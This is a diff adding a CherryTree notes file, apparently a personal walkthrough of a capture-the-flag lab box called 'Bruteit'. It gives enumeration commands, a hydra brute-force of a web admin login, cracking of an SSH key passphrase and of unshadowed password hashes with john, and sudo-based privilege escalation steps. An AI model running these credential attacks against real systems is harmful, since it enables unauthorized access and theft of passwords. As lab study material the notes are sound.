@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Bruteit" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692563328" ts_lastsave="1692566790">
+    <rich_text weight="heavy">Enumeration</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">nmap</rich_text>
+    <rich_text>
+				nmap -sC -sV -Pn -n vv 10.10.13.245
+				
+		</rich_text>
+    <rich_text underline="single">directory enumeration</rich_text>
+    <rich_text>
+				gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.13.245">http://10.10.13.245</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+				
+		</rich_text>
+    <rich_text underline="single">ssh enumeration</rich_text>
+    <rich_text>
+				nc 10.10.13.245 22
+				
+		</rich_text>
+    <rich_text underline="single">apache enumeration</rich_text>
+    <rich_text>
+				wappalyzer browser extention
+
+</rich_text>
+    <rich_text weight="heavy">Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">password cracking for the web page</rich_text>
+    <rich_text>
+				hydra -l admin -P /usr/share/wordlists/rockyou.txt -u 10.10.13.245 http-post-form "/admin/index.php:user=^USER^&amp;pass=^PASS^:Username or password invalid" -V
+				
+		</rich_text>
+    <rich_text underline="single">id_rsa file cracking</rich_text>
+    <rich_text>
+				ssh2john &lt;private key id_rsa&gt; &gt; output
+				john --wordlist=/usr/share/wordlist/rockyou.txt hash
+				
+		</rich_text>
+    <rich_text underline="single">ssh to the target using id_rsa</rich_text>
+    <rich_text>
+				ssh -i id_rsa john@10.10.223.64
+		
+</rich_text>
+    <rich_text weight="heavy">Post Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">privilege escalation</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">sudo permissions</rich_text>
+    <rich_text>
+					sudo -l
+					sudo -ll
+					gtfo bins
+					
+			</rich_text>
+    <rich_text underline="single">password cracking</rich_text>
+    <rich_text>
+					unshadow pass.txt shadow.txt &gt; hash
+					john --wordlist=/usr/share/wordlists/rockyou.txt hash</rich_text>
+  </node>
+</cherrytree>
